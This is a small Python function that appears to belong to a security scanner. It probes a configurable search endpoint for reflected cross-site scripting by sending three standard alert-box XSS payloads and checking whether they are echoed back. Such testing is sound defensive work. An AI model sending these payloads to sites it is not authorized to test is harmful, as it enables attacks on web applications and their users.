import requests

def xss_attack_test(base_url, options=None):
    """
    Tests for simple reflected XSS vulnerabilities by sending payloads 
    as a GET parameter. Returns logs, a severity score, and a boolean success flag.
    """
    if options is None:
        options = {}
    
    logs = []
    success = True
    score = 7  # Example severity score
    
    # Minimal set of XSS payloads for demonstration
    payloads = [
        "<script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
    ]
    
    # Where do we inject? For example: /search?q=<payload>
    endpoint = options.get("endpoint", "/search")
    param_name = options.get("param_name", "q")
    
    for payload in payloads:
        url = f"{base_url.rstrip('/')}{endpoint}?{param_name}={payload}"
        try:
            response = requests.get(url, timeout=10)
            msg = f"[XSS Test] Sent payload {payload} to {url} (Status: {response.status_code})"
            logs.append(msg)
            
            # Simple check: if payload is reflected verbatim in response
            if payload in response.text:
                detection = f"Possible XSS vulnerability detected with payload '{payload}'."
                logs.append(detection)
        except Exception as e:
            # If there's an exception, mark success=False but continue collecting logs
            success = False
            error_msg = f"Error while testing XSS payload '{payload}': {str(e)}"
            logs.append(error_msg)
    
    return logs, score, success
